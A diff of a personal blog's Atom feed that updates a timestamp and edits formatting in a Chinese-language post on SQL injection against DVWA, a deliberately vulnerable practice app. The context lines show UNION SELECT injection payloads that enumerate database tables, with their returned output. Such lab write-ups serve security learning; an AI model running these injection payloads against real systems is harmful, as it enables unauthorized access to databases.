@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://Morn-zh.github.io</id>
     <title>Morn-zh</title>
-    <updated>2021-04-12T14:57:46.515Z</updated>
+    <updated>2021-04-12T14:59:38.769Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://Morn-zh.github.io"/>
     <link rel="self" href="https://Morn-zh.github.io/atom.xml"/>
@@ -179,7 +179,7 @@ ID: 1' union select 1,unhex(hex((select group_concat(table_name,'~',table_schema
 First name: 1
 Surname: guestbook~dvwa,users~dvwa
 </code></pre>
-<p>到这都是用**group_concat()**将内容挤在一块，不好看，明明Ta给了两个位置，开始尝试另外的姿势</p>
+<p>到这都是用group_concat()将内容挤在一块，不好看，明明Ta给了两个位置，开始尝试另外的姿势</p>
 <pre><code>1' union select unhex(hex(table_name)),unhex(hex(table_schema)) from information_schema.tables where table_schema='dvwa'#
 </code></pre>
 <p>返回</p>
